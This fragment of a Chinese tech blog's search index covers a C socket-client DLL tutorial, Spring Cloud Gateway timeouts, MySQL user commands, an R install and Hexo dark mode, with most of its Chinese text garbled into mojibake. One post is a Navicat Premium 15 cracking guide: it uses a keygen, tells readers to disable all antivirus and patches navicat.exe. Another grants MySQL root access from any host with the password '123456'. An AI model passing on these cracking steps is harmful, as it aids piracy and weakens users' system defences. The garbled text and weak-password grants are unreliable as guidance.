encodeCallback == NULL) err \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; tmpHandle-&gt;encodeCallback = encodeCallback; return 0;} ç”Ÿæˆ DLL æ–‡ä»¶DLL é¡¹ç›®æ‰§è¡Œç¼–è¯‘åï¼Œä¼šè‡ªåŠ¨åœ¨é¡¹ç›®æ‰€åœ¨çš„æ–‡ä»¶å¤¹å†…ç”Ÿæˆ .dll ä¸ .lib æ–‡ä»¶ï¼Œä¾‹å¦‚ socket-client.dll ä¸ socket-client.libã€‚åœ¨ VS Studio çš„ Developer Command Prompt å‘½ä»¤çª—å£ä¸­ï¼Œä½¿ç”¨ dumpbin /exports socket-client.dll å‘½ä»¤ï¼ŒæŸ¥çœ‹å¾—åˆ° socket-client.dll åŠ¨æ€é“¾æ¥åº“çš„è¯¦ç»†ä¿¡æ¯å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637Microsoft (R) COFF/PE Dumper Version 14.29.30136.0Copyright (C) Microsoft Corporation. All rights reserved.Dump of file socket-client.dllFile Type: DLL Section contains the following exports for socket-client.dll 00000000 characteristics FFFFFFFF time date stamp 0.00 version 1 ordinal base 6 number of functions 6 number of names ordinal hint RVA name 1 0 00011005 socketclient_destory = @ILT+0(socketclient_destory) 2 1 0001135C socketclient_init = @ILT+855(socketclient_init) 3 2 00011055 socketclient_recv = @ILT+80(socketclient_recv) 4 3 00011195 socketclient_send = @ILT+400(socketclient_send) 5 4 000112E4 socketclient_send_encode = @ILT+735(socketclient_send_encode) 6 5 00011244 socketclient_set_encode_callback = @ILT+575(socketclient_set_encode_callback) Summary 1000 .00cfg 1000 .data 1000 .idata 1000 .msvcjmc 3000 .pdata 4000 .rdata 1000 .reloc 1000 .rsrc 9000 .text 10000 .textbss æ¡ˆä¾‹ä»£ç ä¸‹è½½ ç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  DLL çš„ä¸¤ç§è°ƒç”¨æ–¹å¼DLL åŠ¨æ€è°ƒç”¨åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼Œå®ç°äº†é€šè¿‡å‡½æ•°æŒ‡é’ˆç±»å‹ï¼ŒåŠ¨æ€è°ƒç”¨ DLL é‡Œçš„å‡½æ•°ï¼Œç‚¹å‡»ä¸‹è½½ ä½¿ç”¨åˆ°çš„ socket-client.dll ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ—¥åå¦‚æœ DLL é‡Œé¢çš„å‡½æ•°ä½“ä»£ç ä½œäº†ä¿®æ”¹ï¼Œä¹Ÿä¸å¿…æ”¹åŠ¨å‡½æ•°è°ƒç”¨æ–¹çš„ä»£ç ï¼ˆå¦‚ä¸‹ä»£ç ï¼‰ï¼Œå°±å¯ä»¥æ­£å¸¸å®ç°å‡½æ•°çš„è°ƒç”¨ï¼Œè¿™æ ·éå¸¸ä¾¿äºç¨‹åºçš„ç»´æŠ¤å’Œå‡çº§ã€‚ç‰¹åˆ«æ³¨æ„ï¼ŒåŠ¨æ€è°ƒç”¨ DLL é‡Œçš„å‡½æ•°æ—¶ï¼ˆåŠ¨æ€åŠ è½½ DLLï¼‰ï¼Œä¸éœ€è¦ .h å’Œ .lib æ–‡ä»¶ï¼Œåªéœ€è¦ .dll æ–‡ä»¶ï¼ŒåŒæ—¶è¦çŸ¥é“æ‰€è¦è°ƒç”¨çš„å‡½æ•°çš„å‚æ•°ç±»å‹ä»¥åŠè¿”å›å€¼ç±»å‹ï¼ˆç”¨äºå®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹ï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;#include &lt;windows.h&gt;// å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹typedef int (*SocketInit)(void** handle);typedef int (*SocketSend)(void* handle, unsigned char* buf, int buflen);typedef int (*SocketRev)(void* handle, unsigned char* buf, int* buflen);typedef int (*SocketDestory)(void* handle);int main() { HINSTANCE hInstance; // åŠ è½½DLLåŠ¨æ€é“¾æ¥åº“ hInstance = LoadLibrary("./socket-client.dll"); if (hInstance == NULL) { printf("LoadLibrary() è°ƒç”¨å¤±è´¥, ErrorCode: %d", GetLastError()); return -1; } // è°ƒç”¨DLLåŠ¨æ€é“¾æ¥åº“ SocketInit socketInit = (SocketInit)GetProcAddress(hInstance, "socketclient_init"); SocketSend socketSend = (SocketSend)GetProcAddress(hInstance, "socketclient_send"); SocketRev socketRev = (SocketRev)GetProcAddress(hInstance, "socketclient_recv"); SocketDestory socketDestory = (SocketDestory)GetProcAddress(hInstance, "socketclient_destory"); if (socketInit == NULL) { return -1; } unsigned char inbuf[128]; int inbuflen = 128; unsigned char outbuf[4096]; int outbuflen = 4096; void* handle = NULL; int initResult = socketInit(&amp;handle); int sendResult = socketSend(handle, inbuf, inbuflen); int revResult = socketRev(handle, outbuf, &amp;outbuflen); int destoryResult = socketDestory(handle); printf("initResult = %d\\n", initResult); printf("sendResult = %d\\n", sendResult); printf("revResult = %d\\n", revResult); printf("destoryResult = %d\\n", destoryResult); // é‡Šæ”¾DLLåŠ¨æ€é“¾æ¥åº“ if (hInstance != NULL) { FreeLibrary(hInstance); } return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1234initResult = 0sendResult = 0revResult = 0destoryResult = 0 DLL é™æ€è°ƒç”¨é™æ€è°ƒç”¨ DLL é‡Œçš„å‡½æ•°ï¼ˆé™æ€åŠ è½½ DLLï¼‰ï¼Œéœ€è¦åŒæ—¶ä½¿ç”¨ .hã€.lib ä»¥åŠ .dll æ–‡ä»¶ï¼Œå…·ä½“çš„æ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š a) å°† .hã€.lib ä»¥åŠ .dll æ–‡ä»¶åˆ†åˆ«æ‹·è´åˆ°é¡¹ç›®æ‰€åœ¨çš„æ–‡ä»¶å¤¹å†…ï¼Œå¿…é¡»ä¸ .c æºæ–‡ä»¶å¤„äºåŒä¸€ä¸ªæ–‡ä»¶å¤¹ b) åœ¨éœ€è¦è°ƒç”¨ DLL çš„ .c æºæ–‡ä»¶ä¸­ï¼Œé€šè¿‡ #pragma comment(lib "xxx.lib") æŒ‡ä»¤å¼•å…¥ .lib æ–‡ä»¶ c) åœ¨éœ€è¦è°ƒç”¨ DLL çš„ .c æºæ–‡ä»¶ä¸­ï¼Œé€šè¿‡ #include "xxx.hï¼Œå¼•å…¥ .h å¤´æ–‡ä»¶ d) æ­£å¸¸ç¼–å†™ä»£ç ï¼Œå¹¶è°ƒç”¨ DLL é‡Œçš„å‡½æ•° è‹¥ä½¿ç”¨çš„å¼€å‘å·¥å…·æ˜¯ Visual Studioï¼Œåˆ™å¯ä»¥ä¸é€šè¿‡ #pragma comment(lib "xxx.lib") æŒ‡ä»¤å¼•å…¥ .lib æ–‡ä»¶ã€‚å³é”®é¡¹ç›®ï¼Œé€‰æ‹© å±æ€§ï¼Œå¯¼èˆªåˆ° é…ç½®å±æ€§ -&gt; é“¾æ¥å™¨ -&gt; è¾“å…¥ -&gt; é™„åŠ ä¾èµ–é¡¹ï¼Œæ·»åŠ å¯¹åº”çš„ .lib æ–‡ä»¶åå³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š .h å¤´æ–‡ä»¶é‡Œä¸€èˆ¬å®šä¹‰äº† DLL åŠ¨æ€é“¾æ¥åº“é‡Œçš„å‡½æ•°åŸå‹ï¼Œä¾‹å¦‚ socket-client.h å¤´æ–‡ä»¶çš„ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021#ifndef _INC_MYSOCKETCLIENT_H__#define _INC_MYSOCKETCLIENT_H__#ifdef __cplusplusextern "C" {#endif typedef int (*EncodeData)(unsigned char* in, int inlen, unsigned char* out, int* outlen); int socketclient_init(void** handle); int socketclient_send(void* handle, unsigned char* buf, int buflen); int socketclient_recv(void* handle, unsigned char* buf, int* buflen); int socketclient_destory(void* handle); int socketclient_set_encode_callback(void* handle, EncodeData encodeCallback); int socketclient_send_encode(void* handle, unsigned char* buf, int buflen, EncodeData encodeCallback);#ifdef __cplusplus}#endif#endif /* _INC_MYSOCKETCLIENT_H__ */ é™æ€è°ƒç”¨ DLL é‡Œçš„å‡½æ•°ï¼ˆmain.cï¼‰çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include "socket-client.h"int Hw_Encode(unsigned char* in, int inlen, unsigned char* out, int* outlen) { printf("function Hw_Encode() begin ....\\n"); strcpy((char*)out, "123456789"); *outlen = 9; printf("function Hw_Encode() end ....\\n"); return 0;}int Cisco_Encode(unsigned char* in, int inlen, unsigned char* out, int* outlen) { printf("function Cisco_Encode() begin ....\\n"); strcpy((char*)out, "123456789"); *outlen = 9; printf("function Cisco_Encode() end ....\\n"); return 0;}int main() { unsigned char in[1024]; int inlen; unsigned char out[1024]; int outlen; void* handle = NULL; int ret = 0; strcpy((char*)in, "aaaaaaaa"); inlen = 9; //å®¢æˆ·ç«¯åˆå§‹åŒ– ret = socketclient_init(&amp;handle); if (ret != 0) { printf("function socketclient_init() err:%d \\n", ret); goto End; } printf("the result of socketclient_init() is %d \\n", ret); //è®¾ç½®åŠ å¯†å›è°ƒå‡½æ•° ret = socketclient_set_encode_callback(handle, Cisco_Encode); if (ret != 0) { printf("function socketclient_set_encode_callback() err:%d \\n", ret); } printf("the result of socketclient_set_encode_callback() is %d \\n", ret); //å®¢æˆ·ç«¯å‘é€æŠ¥æ–‡ ret = socketclient_send(handle, in, inlen); if (ret != 0) { printf("function socketclient_send() err:%d \\n", ret); goto End; } printf("the result of socketclient_send() is %d \\n", ret); //å®¢æˆ·ç«¯æŠ¥æ–‡åŠ å¯†å‘é€ ret = socketclient_send_encode(handle, in, inlen, Hw_Encode); if (ret != 0) { printf("function socketclient_send_encode() err:%d \\n", ret); goto End; } printf("the result of socketclient_send_encode() is %d \\n", ret); //å®¢æˆ·ç«¯æ¥æ”¶æŠ¥æ–‡ ret = socketclient_recv(handle, out, &amp;outlen); if (ret != 0) { printf("function socketclient_recv() err:%d \\n", ret); goto End; } printf("the result of socketclient_recv() is %d \\n", ret);End: //å®¢æˆ·ç«¯é‡Šæ”¾èµ„æº ret = socketclient_destory(handle); if (ret != 0) { printf("function socketclient_destory() err:%d \\n", ret); } printf("the result of socketclient_destory() is %d \\n", ret); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12345678910the result of socketclient_init() is 0the result of socketclient_set_encode_callback() is 0function Cisco_Encode() begin ....function Cisco_Encode() end ....the result of socketclient_send() is 0function Hw_Encode() begin ....function Hw_Encode() end ....the result of socketclient_send_encode() is 0the result of socketclient_recv() is 0the result of socketclient_destory() is 0 æ¡ˆä¾‹ä»£ç ä¸‹è½½ ç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ï¼ˆDLL é™æ€è°ƒç”¨ï¼‰ å‚è€ƒåšå®¢ C++ åŠ¨æ€åŠ è½½ DLL å’Œé™æ€åŠ è½½ DLLï¼Œä»¥åŠ DLL çš„ç¼–å†™ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"cè¯­è¨€"},{title:"Spring Cloud Gateway å¼€å‘éšç¬”",url:"/posts/a6f0aaf9.html",text:'Gateway é…ç½®è·¯ç”±è¶…æ—¶æ—¶é—´é…ç½®è·¯ç”±è¶…æ—¶é…ç½®å¯ä»¥ä¸ºæ‰€æœ‰è·¯ç”±é…ç½® HTTP è¶…æ—¶ï¼ˆå“åº”å’Œè¿æ¥ï¼‰ï¼Œå¹¶ä¸ºæ¯ä¸ªç‰¹å®šè·¯ç”±è¦†ç›– HTTP è¶…æ—¶ã€‚ å…¨å±€è·¯ç”±çš„è¶…æ—¶æ—¶é—´é…ç½®é…ç½®å…¨å±€ HTTP è¶…æ—¶ï¼ˆå“åº”å’Œè¿æ¥ï¼‰ï¼Œéœ€è¦ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°ï¼š connect-timeoutï¼šå¿…é¡»ä»¥æ¯«ç§’ä¸ºå•ä½æŒ‡å®šè¿æ¥è¶…æ—¶æ—¶é—´ response-timeoutï¼šå¿…é¡»æŒ‡å®šä¸º java.time.Duration 123456spring: cloud: gateway: httpclient: connect-timeout: 1000 response-timeout: 5s æ¯ä¸ªè·¯ç”±çš„è¶…æ—¶æ—¶é—´é…ç½®å¯ä»¥é€šè¿‡è·¯ç”±çš„ metadata ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°é…ç½®æ¯ä¸ªè·¯ç”±çš„è¶…æ—¶æ—¶é—´ï¼š connect-timeoutï¼šå¿…é¡»ä»¥æ¯«ç§’ä¸ºå•ä½æŒ‡å®šè¿æ¥è¶…æ—¶æ—¶é—´ response-timeoutï¼šå¿…é¡»ä»¥æ¯«ç§’ä¸ºå•ä½æŒ‡å®šå“åº”è¶…æ—¶æ—¶é—´ 123456789- id: per_route_timeouts uri: https://example.org predicates: - name: Path args: pattern: /delay/{timeout} metadata: response-timeout: 1000 connect-timeout: 1000 ä½¿ç”¨ Java DSL ä¸ºæ¯ä¸ªè·¯ç”±é…ç½®è¶…æ—¶æ—¶é—´123456789101112131415import static org.springframework.cloud.gateway.support.RouteMetadataUtils.CONNECT_TIMEOUT_ATTR;import static org.springframework.cloud.gateway.support.RouteMetadataUtils.RESPONSE_TIMEOUT_ATTR;@Beanpublic RouteLocator customRouteLocator(RouteLocatorBuilder routeBuilder){ return routeBuilder.routes() .route("test1", r -&gt; { return r.host("*.somehost.org").and().path("/somepath") .filters(f -&gt; f.addRequestHeader("header1", "header-value-1")) .uri("http://someuri") .metadata(RESPONSE_TIMEOUT_ATTR, 1000) .metadata(CONNECT_TIMEOUT_ATTR, 1000); }) .build();} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡ å¼€å‘éšç¬”"},{title:"MySQL å¸¸ç”¨å‘½ä»¤",url:"/posts/31eec5f6.html",text:'ç”¨æˆ·ç®¡ç†åˆ›å»ºç”¨æˆ·åˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œå¹¶å®Œå…¨æˆæƒè®¿é—®ç‰¹å®šçš„æ•°æ®åº“ 12345create user \'clay\'@\'%\' identified by \'123456\';grant all privileges on mysql_db.* to \'clay\'@\'%\';flush privileges; åˆ é™¤ç”¨æˆ·åˆ é™¤ç”¨æˆ·åŠæƒé™ 1drop user \'clay\'@\'%\'; åˆ›å»ºåªè¯»ç”¨æˆ·åˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œå¹¶æˆäºˆç‰¹å®šæ•°æ®åº“çš„åªè¯»æƒé™ 123grant select on mysql_db.* to \'clay\'@\'%\' identified by \'123456\';flush privileges; æƒé™ç®¡ç†æŸ¥çœ‹ç”¨æˆ·çš„æ‰€æœ‰æƒé™1show grants for \'clay\'@\'%\'; æˆæƒ Root ç”¨æˆ·è¿œç¨‹ç™»å½•*.* ä»£è¡¨æ‰€æœ‰æ•°æ®åº“æ‰€æœ‰æƒé™ï¼Œ\'root\'@\'%\' ä¸­çš„ root ä»£è¡¨ç”¨æˆ·åï¼Œ% ä»£è¡¨æ‰€æœ‰çš„è®¿é—®åœ°å€ï¼Œ123456 æ˜¯ç™»å½•å¯†ç  123GRANT ALL PRIVILEGES ON *.* TO \'root\'@\'%\' IDENTIFIED BY \'123456\' WITH GRANT OPTION;FLUSH PRIVILEGES; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"æ•°æ®åº“"},{title:"Navicat Premium 15 æ°¸ä¹…ç ´è§£æ•™ç¨‹",url:"/posts/319e35f3.html",text:'å‰è¨€è¿™ç¯‡æ–‡ç« ä¸»è¦ä»‹ç» Windows ç³»ç»Ÿä¸‹ Navicat Premium 15 æ°¸ä¹…ç ´è§£çš„æ•™ç¨‹ï¼Œäº²æµ‹æ°¸ä¹…ç ´è§£æœ‰æ•ˆï¼Navicat Premium æ˜¯ MySQLã€MongoDBã€SQL Serverã€Oracle å’Œ PostgreSQL çš„ä¸€ä½“åŒ–æ•°æ®åº“ç®¡ç†å·¥å…·ï¼ŒåŠŸèƒ½éå¸¸å¼ºå¤§ã€‚ å‡†å¤‡å·¥ä½œè½¯ä»¶ç‰ˆæœ¬è¯´æ˜å»ºè®® Navicat Premium 15 è½¯ä»¶å’Œæ³¨å†Œæœºè½¯ä»¶éƒ½ç›´æ¥ä»æœ¬ç«™ä¸‹è½½ï¼Œå½“å‰æœ¬ç«™æä¾›ä¸‹è½½çš„ Navicat Premium ç‰ˆæœ¬æ˜¯ 15.0.26ï¼Œé…å¥—çš„æ³¨å†Œæœºè½¯ä»¶ç‰ˆæœ¬æ˜¯ v5.6ï¼Œä¸¤è€…éƒ½æ˜¯ç»è¿‡äº²æµ‹å¯ä»¥æ°¸ä¹…ç ´è§£çš„ã€‚è¿™æ˜¯å› ä¸ºéšç€æ—¶é—´çš„æ¨ç§»ï¼Œä»å®˜ç½‘ä¸‹è½½çš„æœ€æ–°ç‰ˆ Navicat Premium 15ï¼Œå¹¶ä¸èƒ½ä¿è¯èƒ½è¢« v5.6 ç‰ˆæœ¬çš„æ³¨å†Œæœºæ°¸ä¹…ç ´è§£ã€‚ ä¸‹è½½æ³¨å†Œæœºè½¯ä»¶ æœ¬ç«™ä¸‹è½½åœ°å€ï¼ˆæ¨èï¼‰ï¼šç‚¹å‡»ä¸‹è½½ ç™¾åº¦ç½‘ç›˜åœ°å€ï¼šç‚¹å‡»ä¸‹è½½&nbsp; æå–ç : mzgp ä¸‹è½½ Navicat Premium 15 è½¯ä»¶ å®˜ç½‘ä¸‹è½½åœ°å€ï¼šç‚¹å‡»ä¸‹è½½ æœ¬ç«™ä¸‹è½½åœ°å€ï¼ˆæ¨èï¼‰ï¼šç‚¹å‡»ä¸‹è½½ Navicat Premium 15 ç ´è§£æ³¨æ„äº‹é¡¹ è¿è¡Œæ³¨å†Œæœºè½¯ä»¶ä¹‹å‰ï¼Œå¿…é¡»ä¿è¯æ–­ç½‘ è¿è¡Œæ³¨å†Œæœºè½¯ä»¶ä¹‹å‰ï¼Œå¿…é¡»å…³é—­æ‰€æœ‰æ€æ¯’è½¯ä»¶ï¼ŒåŒ…æ‹¬ 360 æ€æ¯’ã€è…¾è®¯ç®¡å®¶ã€Windows Defender ç­‰ Navicat Premium 15 å®‰è£…å®Œæˆåï¼Œä¸è¦è¿è¡Œ Navicat è½¯ä»¶ï¼Œè€Œæ˜¯ç›´æ¥å…ˆè¿è¡Œæ³¨å†Œæœºè½¯ä»¶ è¿è¡Œæ³¨å†Œæœºè½¯ä»¶æ—¶ï¼Œè¯·é€‰æ‹© Navicat çš„ç‰ˆæœ¬ä¸º Navicat v15 å®‰è£… Navicat Premium 15Navicat Premium 15 ä¸‹è½½å¥½åç›´æ¥å®‰è£…ï¼Œæ­¤å®‰è£…æ­¥éª¤æ¯”è¾ƒç®€å•ï¼Œé€‰æ‹©å®‰è£…ä½ç½®åå…¨éƒ¨ç‚¹å‡»ä¸‹ä¸€æ­¥ æŒ‰é’®å³å¯ ç‰¹åˆ«æ³¨æ„ï¼š Navicat Premium 15 å®‰è£…å®Œæˆåï¼Œä¸è¦è¿è¡Œ Navicat è½¯ä»¶ ç ´è§£ Navicat Premium 15ç¬¬ä¸€æ­¥ç ´è§£ Navicat Premium 15 ä¹‹å‰ï¼Œå¿…é¡»ä¿è¯æ–­ç½‘ï¼ŒåŒæ—¶å¿…é¡»å…³é—­æ‰€æœ‰æ€æ¯’è½¯ä»¶ï¼Œä¾‹å¦‚ 360 æ€æ¯’ã€è…¾è®¯ç®¡å®¶ã€Windows Defender ç­‰ ç¬¬äºŒæ­¥ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œæ³¨å†Œæœºè½¯ä»¶ï¼Œå‹¾é€‰ Backupã€Host å’Œ Navicat v15ï¼Œç„¶åç‚¹å‡» Patch æŒ‰é’®ï¼Œæ‰¾åˆ° Navicat Premium 15 å®‰è£…ç›®å½•ä¸‹çš„ navicat.exeï¼Œé€‰ä¸­å¹¶ç‚¹å‡»æ‰“å¼€ï¼ŒPatch æˆåŠŸåä¼šæç¤º navicat.exe - x64 -&gt; Crackedï¼Œè¡¨ç¤º Navicat Premium 15 å·²è¢«ç ´è§£ æç¤ºï¼šå¦‚æœ Navicat å®‰è£…åœ¨é»˜è®¤ä½ç½®ï¼Œç‚¹å‡» Patch æŒ‰é’®åï¼Œä¼šç›´æ¥æç¤º navicat.exe - x64 -&gt; Crackedï¼Œè€Œä¸å†å¼¹çª—è®©ä½ é€‰æ‹©ç‰¹å®šå®‰è£…ç›®å½•ä¸‹çš„ navicat.exe ç¬¬ä¸‰æ­¥Licenses é¡¹é€‰æ‹© Enterpriseï¼ŒProducts é¡¹é€‰æ‹© Premiumï¼ŒLanguages é¡¹é€‰æ‹© Simplified Chineseï¼ŒResale License é¡¹é€‰æ‹© Site Licenseï¼Œç„¶åç‚¹å‡» Generate æŒ‰é’®ï¼Œç”Ÿæˆè®¸å¯è¯å¯†é’¥ (adsbygoogle = window.adsbygoogle || []).push({}); ç¬¬å››æ­¥è¿è¡Œ Navicat Premium 15 è½¯ä»¶ï¼Œç‚¹å‡» æ³¨å†Œ æŒ‰é’®ï¼Œæˆ–è€…åœ¨ä¸»ç•Œé¢çš„èœå•æ å¯¼èˆªåˆ°ï¼šå¸®åŠ© -&gt; æ³¨å†Œ ç²˜è´´ä¸Šä¸€æ­¥ç”Ÿæˆçš„è®¸å¯è¯å¯†é’¥åˆ° Navicat Premium 15 çš„è®¸å¯è¯å¯†é’¥è¾“å…¥æ¡†ï¼Œç„¶åç‚¹å‡» æ¿€æ´» æŒ‰é’® ç´§æ¥ç€ç‚¹å‡» æ‰‹åŠ¨æ¿€æ´» æŒ‰é’® ç‚¹å‡» æ‰‹åŠ¨æ¿€æ´» æŒ‰é’®åï¼Œæ˜¾ç¤ºçš„ç•Œé¢å¦‚ä¸‹ï¼Œè¯¥ç•Œé¢ä¼šæ˜¾ç¤º Navicat Premium 15 çš„ è¯·æ±‚ç  ç¬¬äº”æ­¥å°†ä¸Šä¸€æ­¥ Navicat Premium 15 ç”Ÿæˆçš„ è¯·æ±‚ç  ç²˜è´´åˆ°æ³¨å†Œæœºè½¯ä»¶çš„ Request Code è¾“å…¥æ¡†ä¸­ï¼Œç„¶åç‚¹å‡» Generate æŒ‰é’®ï¼Œç”Ÿæˆæ¿€æ´»ç  æœ€åå°†æ³¨å†Œæœºè½¯ä»¶ç”Ÿæˆçš„æ¿€æ´»ç ç²˜è´´åˆ° Navicat Premium 15 çš„æ¿€æ´»ç è¾“å…¥æ¡†ï¼Œç„¶åç‚¹å‡» æ¿€æ´» æŒ‰é’® æˆåŠŸæ¿€æ´»åçš„æç¤ºç•Œé¢å¦‚ä¸‹ ä¹Ÿå¯ä»¥åœ¨ Navicat Premium 15 ä¸»ç•Œé¢çš„èœå•æ å¯¼èˆªåˆ°ï¼šå¸®åŠ© -&gt; æ³¨å†Œ æ¥æŸ¥çœ‹æ˜¯å¦æˆåŠŸæ¿€æ´» å¸¸è§é—®é¢˜ç ´è§£å¤±è´¥è‹¥ç ´è§£å¤±è´¥ï¼Œé¦–å…ˆå¸è½½ Navicat Premium 15 è½¯ä»¶ï¼Œç„¶åæ¸…ç†æ³¨å†Œè¡¨å¹¶é‡å¯ç³»ç»Ÿï¼Œæœ€åå†å°è¯•é‡æ–°å®‰è£…å¹¶ç ´è§£ Navicat è½¯ä»¶ å‚è€ƒåšå®¢ Navicat çš„ Linux ç‰ˆç ´è§£å·¥å…· Linux å®‰è£… Navicat Premium 15 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Centos 7 å®‰è£… R è¯­è¨€",url:"/posts/a4ef22cd.html",text:'å‰è¨€ R å®˜ç½‘ä¸‹è½½ RStudio å®˜ç½‘ä¸‹è½½ RPM å®‰è£… Rå› ä¸º R å·²ç»ç”± EPEL ä»“åº“ç®¡ç†ï¼Œæ‰€ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£… R 12345678# å®‰è£…EPEL# yum install epel-release# å®‰è£…R# yum install R# æŸ¥çœ‹Rçš„ç‰ˆæœ¬# R --version RPM å®‰è£… RStudioä» å®˜ç½‘ä¸‹è½½ RStudio Desktop æˆ–è€… RStudio Server çš„ RPM å®‰è£…åŒ…ï¼Œç„¶åç›´æ¥ä½¿ç”¨ä»¥ä¸‹ RPM å‘½ä»¤å®‰è£…å³å¯ 1# rpm -ivh rstudio-1.4.1106-x86_64.rpm éªŒè¯ R çš„å®‰è£…åˆ›å»º /usr/local/R/demo.R æºæ–‡ä»¶ï¼Œå†™å…¥ä»¥ä¸‹ä»£ç  12345x &lt;- c(1,2,5,7,9)y &lt;- c(2,4,7,8,10)plot(x,y)abline(lm(y~x))title("å›å½’å›¾è¡¨") åœ¨ R çš„äº¤äº’ç»ˆç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè¿è¡Œä¸Šè¿°çš„ä»£ç ï¼Œè‹¥å¯ä»¥æ­£å¸¸æ˜¾ç¤º å›å½’å›¾è¡¨ï¼Œåˆ™è¯´æ˜ R å®‰è£…æˆåŠŸ 123$ R&gt; setwd("/usr/local/R/")&gt; source("demo.R") R å®‰è£… Package12$ R&gt; install.packages("httr") var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Hexo Next 8.x ä¸»é¢˜æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼",url:"/posts/abf4aee1.html",text:"å‰è¨€Next 8.x åŸç”Ÿçš„æš—é»‘æ¨¡å¼Next 8.x ä¸»é¢˜å·²ç»åŸç”Ÿæ”¯æŒæš—é»‘æ¨¡å¼ï¼Œåªéœ€è¦åœ¨ Next çš„ _config.yml é…ç½®æ–‡ä»¶ä¸­ï¼Œå°†ç›¸åº”çš„å¼€å…³æ‰“å¼€å³å¯ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼š 1darkmode: true Next 8.x ä¸»é¢˜åŸç”Ÿæš—é»‘æ¨¡å¼çš„ä¼˜ç¼ºç‚¹ï¼š ä¼˜ç‚¹ï¼š é…ç½®éå¸¸ç®€å• ç¼ºç‚¹ï¼š 